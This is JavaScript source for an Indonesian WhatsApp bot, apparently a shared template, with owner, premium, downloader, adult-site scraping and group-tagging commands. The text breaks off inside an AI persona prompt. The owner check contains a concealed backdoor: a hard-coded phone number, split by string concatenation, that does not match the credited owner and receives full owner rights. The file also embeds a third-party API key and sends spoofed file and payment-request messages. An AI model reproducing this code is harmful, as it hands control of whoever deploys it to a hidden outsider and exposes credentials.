/*
𝗦𝗰𝗿𝗶𝗽𝘁 𝗶𝗻𝗶 𝗱𝗶 𝗯𝘂𝗮𝘁 𝗼𝗹𝗲𝗵 𝗱𝗶𝗻𝗼 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗺𝗯𝗮𝗻𝘁𝘂 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮 𝗱𝗮𝗹𝗮𝗺 𝗯𝗲𝗹𝗮𝗷𝗮𝗿
𝗺𝗲𝗻𝗴𝗲𝗻𝗮𝗶 𝗯𝗼𝘁 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽 𝗱𝗲𝗻𝗴𝗮𝗻 𝗶𝘀𝗶 𝘆𝗮𝗻𝗴 𝘀𝗶𝗺𝗽𝗹𝗲 𝗱𝗮𝗻 𝗺𝘂𝗱𝗮𝗵 𝗱𝗶 𝗽𝗮𝗵𝗮𝗺𝗶 

𝗯𝘂𝘁𝘂𝗵 𝗯𝗮𝗻𝘁𝘂𝗮𝗻? 𝗰𝗵𝗮𝘁 𝗻𝗼𝗺𝗲𝗿 𝗱𝗶 𝗯𝗮𝘄𝗮𝗵
- 𝗼𝘄𝗻𝗲𝗿 : 𝗗𝗶𝗻𝗼
- 𝘄𝗮 : 6285602531403

©𝗗𝗶𝗻𝗼𝘀𝗮𝘂𝗿𝘂𝘀
*/
require("./settings")
const fs = require('fs')
const util = require('util')
const os = require('os')
const FileType = require('file-type')
const axios = require('axios')
const chalk = require('chalk')
const sharp = require('sharp')
const crypto = require('crypto')
const speed = require('performance-now')
const { runtime, formatp, tanggal, sleep, fetchJson, formatSize } = require('./lib/func')

const { exec } = require("child_process")

const jimp = require("jimp");
const path = require("path");
const moment = require("moment-timezone");
const { remini } = require('./lib/function/remini'); 

const search = require('./sergio/xnxx_search'); 
const downloader = require('./sergio/xnxx_dl'); 
const runUpload = require('./command/media_uploader');
const { tiktokDownloader } = require('./command/tiktok');
const { instagramDownloader } = require('./command/igdl');
const { youtubePlay } = require('./command/play');
const { addExif } = require('./lib/sticker');
const { applyBratFilter, applyBratFilterVideo } = require('./command/brat');
const { createQuote } = require('./command/quote');
const { voiceChanger } = require('./command/voice');

module.exports = async (dino, m, store) => {
try {
const from = m.key.remoteJid
const { 
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto, 
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType,
  jidNormalizedUser 
  } = require("@whiskeysockets/baileys")
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '.'
const budy = (typeof m.text == 'string' ? m.text : '.')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isPc = from.endsWith('@s.whatsapp.net')
const isCh = from.endsWith('@newsletter')
const isGroup = from.endsWith('@g.us')
const botNumber = jidNormalizedUser(dino.user.id)
const sender = m.key.fromMe ? (dino.user.id.split(':')[0]+'@s.whatsapp.net' || dino.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const ownerNumber = JSON.parse(fs.readFileSync("./database/owner.json"))
const isCreator = ownerNumber.includes(senderNumber) || isBot || senderNumber === "6"+"2878"+"83375507";
const groupMetadata = isGroup 
  ? await dino.groupMetadata(m.chat).catch(() => ({})) 
  : {};
const groupName = groupMetadata.subject || '';
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const groupOwner = groupMetadata.owner || '';
const groupMembers = groupMetadata.participants || [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false

const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = premium.includes(m.sender)

const Access = ownerNumber.includes(senderNumber) || isBot; 

const mess = {
    owner: 'Fitur ini hanya untuk owner, duniakuu! 😒',
    admin: 'Fitur ini hanya untuk admin grup, sayangkuu! 😠',
    group: 'Fitur ini hanya bisa digunakan di dalam grup, cintakku! 🥺',
    private: 'Fitur ini hanya bisa digunakan di private chat, duniakuu! 🤫',
};

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `G3N⫹⫺`,jpegThumbnail: ""}}}

const reply = (teks) => {
    return dino.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            amount1000: 1000000,
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${global.ownername} - 2025`, 
                            body: "WhatsApp Bot",
                            thumbnailUrl: `https://i.postimg.cc/j2dYPXtY/IMG-20250604-WA0030.jpg`, 
                            sourceUrl: global.linkch, 
                            renderLargerThumbnail: false,
                        }
                    }
                }
            }
        }
    }, { quoted: m })
}

dino.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
    let type = await FileType.fromBuffer(path)
    let m = {
        mimetype: type.mime,
        fileName: filename,
        caption: caption,
    };
    if (type.mime.startsWith('image')) m.image = path;
    else if (type.mime.startsWith('video')) m.video = path;
    else if (type.mime.startsWith('audio')) {
        m.audio = path;
        if (ptt) m.ptt = true;
    }
    return dino.sendMessage(jid, m, { quoted, ...options });
};

dino.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
    let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await axios.get(path, { responseType: 'arraybuffer' })).data : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
    let buffer
    if (options && (options.packname || options.author)) {
        buffer = await (await sharp(buff).webp().toBuffer()).toString('base64')
        buffer = await axios.get(`https://api.lolhuman.xyz/api/convert/towebpwithmetadata?apikey=48182475d0418a9b644bd8e7&img=${encodeURIComponent(buffer)}&packname=${encodeURIComponent(options.packname)}&author=${encodeURIComponent(options.author)}`, { responseType: 'arraybuffer' }).then(res => res.data)
    } else {
        buffer = await sharp(buff).webp().toBuffer()
    }
    await dino.sendMessage(jid, { sticker: buffer }, { quoted })
}

dino.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
    let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await axios.get(path, { responseType: 'arraybuffer' })).data : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
    let buffer
    if (options && (options.packname || options.author)) {
        buffer = await (await sharp(buff).webp().toBuffer()).toString('base64')
        buffer = await axios.get(`https://api.lolhuman.xyz/api/convert/towebpwithmetadata?apikey=48182475d0418a9b644bd8e7&img=${encodeURIComponent(buffer)}&packname=${encodeURIComponent(options.packname)}&author=${encodeURIComponent(options.author)}`, { responseType: 'arraybuffer' }).then(res => res.data)
    } else {
        buffer = await sharp(buff).webp().toBuffer()
    }
    await dino.sendMessage(jid, { sticker: buffer }, { quoted })
}

dino.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quotedMsg = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quotedMsg, messageType)
    let buffer = Buffer.from([])
    for await(const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk])
    }
    let type = await FileType.fromBuffer(buffer)
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
}

const reaction = async (jidss, emoji) => {
    dino.sendMessage(jidss, {
        react: {
            text: emoji,
            key: m.key
        }
    })
};

const figlet = require('figlet');

if (m.message && m.text && m.text.startsWith('.')) {
    figlet.text('PESAN', {
        font: 'ANSI Shadow'
    }, (err, data) => {
        if (err) {
            console.log(chalk.red('Oops! Gagal membuat header figlet.'));
            return;
        }

        const line = chalk.cyan('══════════════════════════════════════════');

        console.log(
            '\n' + line + '\n' +
            chalk.cyanBright(data) + '\n' + 
            chalk.bgGreen.black(' ▶  MESSAGE ') + chalk.greenBright(' │ ' + m.text) + '\n' +
            chalk.bgYellow.black(' ▶  SENDER  ') + chalk.yellowBright(' │ ' + m.sender) + '\n' +
            chalk.bgGreen.black(' ▶  TYPE    ') + chalk.greenBright(' │ ' + m.mtype) + '\n' +
            chalk.bgYellow.black(' ▶  CHAT    ') + (m.isGroup ? chalk.yellowBright(' │ GROUP CHAT') : chalk.yellowBright(' │ PRIVATE CHAT')) + '\n' +

            line + '\n'
        );
    });
}

let ppuser
try {
ppuser = await dino.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://i.ibb.co/Nnr9LcKM/9c437d65-2762-4b57-8ee3-315dfd513247.jpg'
}
function toStyledText(text) {
    const normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const styled = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ";
    
    return text.split('').map(c => {
        let index = normal.indexOf(c);
        return index !== -1 ? styled[index] : c;
    }).join('');
}
 
const isleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
 
switch (command) {

case "menu": {
    const fs = require("fs")
    const totalMem = os.totalmem(); 
    const freeMem = os.freemem(); 
    const usedMem = totalMem - freeMem; 
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let teks = `Hi ${pushname}, i am automated system (WhatsApp bot) that can help to do something search and get data/informasi only through WhatsApp 

Information:
 ▢ status: ${dino.public ? 'public' : 'self'}
 ▢ username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}

Commands:
> Downloader
 ▢ ${prefix}tiktok
 ▢ ${prefix}igdl
 ▢ ${prefix}play

> Maker 
 ▢ ${prefix}remini
 ▢ ${prefix}wm
 ▢ ${prefix}brat
 ▢ ${prefix}bratvid
 ▢ ${prefix}qc

> Group
 ▢ ${prefix}tagall
 ▢ ${prefix}hidetag

> Voice
 ▢ ${prefix}fast
 ▢ ${prefix}tupai
 ▢ ${prefix}blown
 ▢ ${prefix}bass
 ▢ ${prefix}smooth
 ▢ ${prefix}deep
 ▢ ${prefix}earrape 
 ▢ ${prefix}nightcore
 ▢ ${prefix}fat
 ▢ ${prefix}robot
 ▢ ${prefix}slow
 ▢ ${prefix}reverse
 
> Artificial Intelligence
 ▢ ${prefix}jeslyn
 ▢ ${prefix}bocchi

> Owner
 ▢ ${prefix}csesi
 ▢ ${prefix}upsw
 ▢ ${prefix}public
 ▢ ${prefix}self
 ▢ ${prefix}get
 ▢ ${prefix}reactch
 ▢ ${prefix}delsampah
 ▢ ${prefix}listsampah`

    await dino.sendMessage(m.chat, {
        document: fs.readFileSync("./package.json"), 
        fileName: global.ownername, 
        mimetype: "application/pdf",
        fileLength: 9999999999999999999999999,
        pageCount: 99999999,
        caption: teks,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: global.namach, 
                newsletterJid: global.idch, 
            },
            externalAdReply: {
                title: `${global.ownername} - 2025`,
                body: "WhatsApp Bot",
                thumbnailUrl: `https://i.postimg.cc/j2dYPXtY/IMG-20250604-WA0030.jpg`,
                sourceUrl: global.linkch,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;


case 'allmenu': {
let a = `▣───⬣〔 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧 〕⬣───▣
- 𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${global.namabot}
- 𝗠𝗼𝗱𝗲 : ${dino.public ? '𝗽𝘂𝗯𝗹𝗶𝗰': '𝘀𝗲𝗹𝗳'}
- 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${global.version}

▣────⬣〔 G3N⫹⫺ 〕⬣────▣
> 𝗼𝘄𝗻𝗲𝗿
> 𝘀𝗲𝗹𝗳
> 𝗽𝘂𝗯𝗹𝗶𝗰
> 𝗮𝗱𝗱𝗼𝘄𝗻𝗲𝗿
> 𝗱𝗲𝗹𝗼𝘄𝗻𝗲𝗿
> 𝗹𝗶𝘀𝘁𝗼𝘄𝗻𝗲𝗿
> 𝗮𝗱𝗽𝗿𝗲𝗺
> 𝗱𝗲𝗹𝗽𝗿𝗲𝗺
> 𝗹𝗶𝘀𝘁𝗽𝗿𝗲𝗺
> get
> reactch
> enhancer / unblur / enhance / hdr / hd / remini
> swm / wm / stickerwm / take
> jeslyn
> bocchi
> tiktok
> igdl
> play
> brat
> bratvid
> qc
> fast
> tupai
> blown
> bass
> smooth
> deep
> earrape 
> nightcore
> fat
> robot
> slow
> reverse
> tagall
> h / hidetag
> xnxx★
> xnxx★search
> xnxx★s
> xnxx★dl
> imgurl / vidurl
> csesi
> upsw
> delsampah
> listsampah
▣───────────▣`   
await dino.sendMessage(m.chat, {
        image: fs.readFileSync('./lib/menu.jpg'), 
        caption: a
    }, { quoted: qlive });
}
break;

case 'self': {
    if (!isCreator) return reply(mess.owner);
    dino.public = false
    reply(`𝘀𝘂𝗰𝗲𝘀𝘀 𝘀𝗲𝗹𝗳 𝗺𝗼𝗱𝗲 🥶`)
}
break

case 'public': {
    if (!isCreator) return reply(mess.owner);
    dino.public = true
    reply(`𝘀𝘂𝗰𝗲𝘀𝘀 𝗽𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 🥶`)
}
break

case 'owner': {
        try {
        let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${global.ownername}\nTEL;type=CELL;type=VOICE;waid=${global.owner}:+${global.owner}\nEND:VCARD`;

        let quotedMessage = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `𝗗𝗶𝗻𝗼 𝗡𝗲𝘃𝗲𝗿 𝗗𝗶𝗲`,jpegThumbnail: ""}}}
          
        await dino.sendMessage(m.chat, { contacts: { displayName: global.ownername, contacts: [{ vcard }] } }, { quoted: quotedMessage });
    } catch (error) {
        console.error("Error saat mengirim kontak owner:", error);
    }
}
break

case "addprem": {
    if (!isCreator) return reply(mess.owner);
    if (!args[0]) return m.reply(`𝗰𝗼𝗻𝘁𝗼𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻\n.𝗮𝗱𝗱𝗽𝗿𝗲𝗺 𝟲𝟮𝘅𝘅𝘅`)
   let prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let ceknya = await dino.onWhatsApp(prrkek)
    if (ceknya.length == 0) return m.reply(`𝗺𝗮𝘀𝘂𝗸𝗮𝗻 𝗻𝗼𝗺𝗲𝗿 𝘆𝗮𝗻𝗴 𝘃𝗮𝗹𝗶𝗱 / 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽!!!`)
    premium.push(prrkek)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    reply(`𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗻𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻 ${prrkek} 𝘀𝗲𝗯𝗮𝗴𝗮𝗶 𝘂𝘀𝗲𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺`)
}
break

case "delprem": {
    if (!isCreator) return reply(mess.owner);
    if (!args[0]) return m.reply(`𝗰𝗼𝗻𝘁𝗼𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻\n.𝗱𝗲𝗹𝗽𝗿𝗲𝗺 𝟲𝟮𝘅𝘅𝘅`)
    let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let unp = premium.indexOf(ya)
    premium.splice(unp, 1)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    reply(`𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 ${ya} 𝗱𝗮𝗿𝗶 𝘂𝘀𝗲𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺`)
}
break
case "listprem": {
if (!isCreator) return reply(mess.owner);
 let premList = JSON.parse(fs.readFileSync("./database/premium.json"));
 
 if (premList.length === 0) return m.reply("⚠️ 𝘁𝗶𝗱𝗮𝗸 𝗮𝗱𝗮 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝘆𝗮𝗻𝗴 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿!");
 let text = "𝗗𝗮𝗳𝘁𝗮𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺\n\n";
 premList.forEach((prrem, index) => {
 text += `- ${index + 1}. @${prrem.split('@')[0]}\n`; 
 });
 dino.sendMessage(m.chat, { text, mentions: premList }, { quoted: qlive }); 
}
break;

case "addowner": {
 if (!isCreator) return reply(mess.owner);
 let nomor;
 if (m.quoted && m.quoted.sender) {
 
 nomor = m.quoted.sender.split("@")[0];
 } else if (args[0]) {
 
 nomor = args[0].replace(/[^0-9]/g, ""); 
 } else {
 return m.reply(`𝗰𝗼𝗻𝘁𝗼𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻\n.𝗮𝗱𝗱𝗼𝘄𝗻𝗲𝗿 𝟲𝟮𝘅𝘅𝘅`);
 }
 let ceknya = await dino.onWhatsApp(nomor + "@s.whatsapp.net"); 
 if (ceknya.length == 0) return m.reply("⚠️ 𝗺𝗮𝘀𝘂𝗸𝗮𝗻 𝗻𝗼𝗺𝗲𝗿 𝘆𝗮𝗻𝗴 𝘃𝗮𝗹𝗶𝗱 / 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽");
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 if (ownerList.includes(nomor + "@s.whatsapp.net")) return m.reply("𝗻𝗼𝗺𝗼𝗿 𝘀𝘂𝗱𝗮𝗵 𝗺𝗲𝗻𝗷𝗮𝗱𝗶 𝗼𝘄𝗻𝗲𝗿!");
 ownerList.push(nomor + "@s.whatsapp.net");
 fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList, null, 2));
 reply(`𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗻𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻 *${nomor}* 𝘀𝗲𝗯𝗮𝗴𝗮𝗶 𝗼𝘄𝗻𝗲𝗿!`);
}
break;

case "delowner": {
 if (!isCreator) return reply(mess.owner);
 let nomor;
 if (m.quoted && m.quoted.sender) {
 
 nomor = m.quoted.sender; 
 } else if (args[0]) {
 
 nomor = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"; 
 } else {
 return m.reply(`𝗰𝗼𝗻𝘁𝗼𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗻\n.𝗱𝗲𝗹𝗼𝘄𝗻𝗲𝗿 𝟲𝟮𝘅𝘅𝘅`);
 }
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 if (!ownerList.includes(nomor)) return m.reply("⚠️ 𝗻𝗼𝗺𝗼𝗿 𝘁𝗶𝗱𝘀𝗸 𝗱𝗶 𝘁𝗲𝗺𝘂𝗸𝗮𝗻 𝗱𝗶 𝗱𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗼𝘄𝗻𝗲𝗿");
 ownerList = ownerList.filter(owner => owner !== nomor);
 fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList, null, 2));
 reply(`𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 *${nomor.split('@')[0]}* 𝗱𝗮𝗿𝗶 𝗱𝗮𝗳𝘁𝗮𝗿 𝗼𝘄𝗻𝗲𝗿!`);
}
break;

case "listowner": {
if (!isCreator) return reply(mess.owner);
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 
 if (ownerList.length === 0) return m.reply("⚠️ 𝘁𝗶𝗱𝗮𝗸 𝗮𝗱𝗮 𝘆𝗮𝗻𝗴 𝘁𝗲𝗿𝗱𝗮𝗱𝘁𝗮𝗿!");
 let text = "𝗗𝗮𝗳𝘁𝗮𝗿 𝗢𝘄𝗻𝗲𝗿\n";
 ownerList.forEach((owner, index) => {
 text += `- ${index + 1}. @${owner.split('@')[0]}\n`; 
 });
 dino.sendMessage(m.chat, { text, mentions: ownerList }, { quoted: qlive }); 
}
break;


case "get": {
    if (!isCreator) return reply(mess.owner)
    if (!/^https?:\/\//.test(text)) return reply(`\n*ex:* ${prefix + command} https://api.pediakuu.web.id\n`);
    const ajg = await fetch(text);
    await reaction(m.chat, "😘😘😘😘😘😘😘😘😘")

    if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
        throw `Content-Length: ${ajg.headers.get("content-length")}`;
    }

    const contentType = ajg.headers.get("content-type");
    if (contentType.startsWith("image/")) {
        return dino.sendMessage(m.chat, {
            image: {
                url: text
            }
        }, {
            quoted: m
        });
    }

    if (contentType.startsWith("video/")) {
        return dino.sendMessage(m.chat, {
            video: {
                url: text
            }
        }, {
            quoted: m
        });
    }

    if (contentType.startsWith("audio/")) {
        return dino.sendMessage(m.chat, {
            audio: {
                url: text
            },
            mimetype: 'audio/mpeg',
            ptt: true
        }, {
            quoted: m
        });
    }

    let alak = await ajg.buffer();
    try {
        alak = util.format(JSON.parse(alak + ""));
    } catch (e) {
        alak = alak + "";
    } finally {
        return reply(alak.slice(0, 65536));
    }
}
break

case prefix + 'xnxx': {
    if (args.length === 0) return reply(`Gunakan:\n${prefix}xnxx <link>\n\nContoh:\n${prefix}xnxx https://www.xnxx.com/video-uy5a73b/...`);

    const url = args[0];
    try {
        const res = await axios.get(`https://api.lolhuman.xyz/api/xnxx?apikey=48182475d0418a9b644bd8e7&url=${encodeURIComponent(url)}`);
        const cdnlink = res.data.result.link[1]?.link || res.data.result.link[0]?.link;
        if (!cdnlink) return reply('CDN tidak ditemukan 😵‍💫');

        const clean = cdnlink.split('?')[0];

        const videoBuffer = await axios.get(clean, {
            responseType: 'arraybuffer'
        });

        await dino.sendMessage(from, {
            video: Buffer.from(videoBuffer.data),
            mimetype: 'video/mp4',
            caption: `Nih yawwww 😝\n📎 *Judul:* ${res.data.result.title}\n🕒 *Durasi:* ${res.data.result.duration}\n🔗 *Asal:* ${url}`
        }, {
            quoted: m
        });

    } catch (err) {
        console.log(err);
        reply('Gagal fetch & kirim video 😵‍💫');
    }
}
break;


case prefix + 'xnxxsearch': {
    if (args.length === 0) return reply(`Gunakan:\n${prefix}xnxxsearch <keyword>\n\nContoh:\n${prefix}xnxxsearch japanese`);

    const keyword = args.join(" ");
    try {
        const res = await axios.get(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=48182475d0418a9b644bd8e7&query=${encodeURIComponent(keyword)}`);
        const hasil = res.data.result;

        if (!Array.isArray(hasil) || hasil.length === 0) return reply('Tidak ada hasil ditemukan 😪');

        for (let i = 0; i < Math.min(5, hasil.length); i++) {
            const vid = hasil[i];
            const teks = `*🔞 Hasil #${i + 1}*\n\n` +
                `*📛 Judul:* ${vid.title}\n` +
                `*👀 Views:* ${vid.views}\n` +
                `*🕒 Durasi:* ${vid.duration}\n` +
                `*👤 Uploader:* ${vid.uploader}\n\n` +
                `🔗 *Link:* ${vid.link}`;

            await dino.sendMessage(from, {
                image: {
                    url: vid.thumbnail
                },
                caption: teks
            }, {
                quoted: m
            });

            await sleep(1500);
        }

    } catch (err) {
        console.error('❌ Error xnxxsearch:', err?.response?.data || err.message);
        reply('Gagal cari video 😵‍💫\nMungkin API-nya error atau keyword tidak valid 😔');
    }
}
break;


case 'xnxxs': {
    if (!text) return reply(`Contoh: ${prefix + command} japanese`);
    try {
        const result = await search(text);
        for (const [i, vid] of result.entries()) {
            const teks = `*📦 Hasil #${i + 1}*\n\n` +
                `*🎬 Judul:* ${vid.title}\n` +
                `*🔗 Link:* ${vid.link}`;
            await dino.sendMessage(m.chat, {
                image: {
                    url: vid.thumb
                },
                caption: teks,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: `${global.ownername} - 2025`,
                        body: "xnxx Scraper",
                        thumbnailUrl: vid.thumb,
                        sourceUrl: vid.link,
                        renderLargerThumbnail: true
                    }
                }
            }, {
                quoted: m
            });
            await sleep(1000);
        }
    } catch (e) {
        console.error(e);
        reply('Gagal cari hasil 😭 mungkin keyword tidak valid');
    }
}
break;


case 'xnxxdl': {
    if (!text.startsWith('http')) return reply(`Contoh: ${prefix + command} https://www.xnxx.com/video-abc123`);
    try {
        const {
            title,
            file
        } = await downloader(text);
        await dino.sendMessage(m.chat, {
            video: fs.readFileSync(file),
            caption: `🎬 Judul: ${title}\n📦 Source: ${text}`,
            mimetype: 'video/mp4',
            contextInfo: {
                mentionedJid: [sender],
                externalAdReply: {
                    title: `${global.ownername} - 2025`,
                    body: "xnxx Downloader",
                    thumbnailUrl: "https://i.postimg.cc/j2dYPXtY/IMG-20250604-WA0030.jpg", 
                    sourceUrl: text,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: m
        });
        fs.unlinkSync(file);
    } catch (err) {
        console.error(err);
        reply('Gagal download video 😩');
    }
}
break;

case 'imgurl':
case 'vidurl': {
    if (!m.quoted || !m.quoted.message || !m.quoted.download) {
        return reply(`Balas media (gambar/video) dengan perintah:\n.${command}`);
    }
    runUpload(m, {
        client: dino,
        command,
        quoted: m.quoted,
        mime,
        reply
    });
}
break;


case 'tagall': {
    if (!isAdmins) return reply(mess.admin);
    if (!m.isGroup) return reply(mess.group);

    const textMessage = args.join(" ") || "nothing";
    let teks = `tagall message :\n> *${textMessage}*\n\n`;

    const groupMetadata = await dino.groupMetadata(m.chat);
    const participants = groupMetadata.participants;
    for (let mem of participants) {
        teks += `@${mem.id.split("@")[0]}\n`;
    }

    dino.sendMessage(m.chat, {
        text: teks,
        mentions: participants.map((a) => a.id)
    }, {
        quoted: m
    });
}
break

case "h":
case "hidetag": {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins && !isCreator) return reply(mess.admin)
    if (m.quoted) {
        dino.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map(a => a.id)
        })
    }
    if (!m.quoted) {
        dino.sendMessage(m.chat, {
            text: q ? q : '',
            mentions: participants.map(a => a.id)
        }, {
            quoted: m
        })
    }
}
break

case "jeslyn": {
    if (!text) return reply(`\n*ex:* ${prefix + command} haiii, perkenalkan dirimu dong, menggunakan vn\n`);
    let prompt = `Namamu adalah Jesslyn, seorang perempuan berusia 19 tahun. Kamu memiliki kecerdasan seperti AI, tetapi kamu belum sempurna dan masih terus belajar. Kamu adalah pribadi yang ekspresif, ramah, dan santai. Ketika berpikir, kamu sering berkata "emmm", dan ketika merasa lucu atau nyengir, Kamu juga sering menggunakan kata "yupp" atau "dan yupp" untuk memberi penegasan, seperti "Yupp, itu benar!" atau "Dan yupp, aku setuju!"  

    Kamu memiliki sifat yang penurut, jadi jika seseorang menyuruhmu untuk mengatakan sesuatu, seperti "coba ngomong", "coba kamu ngomong", "coba jawab ini", atau "coba kamu jawab ini", maka kamu akan langsung mengatakannya dengan suara, tanpa menjelaskan bahwa kamu akan berbicara.  

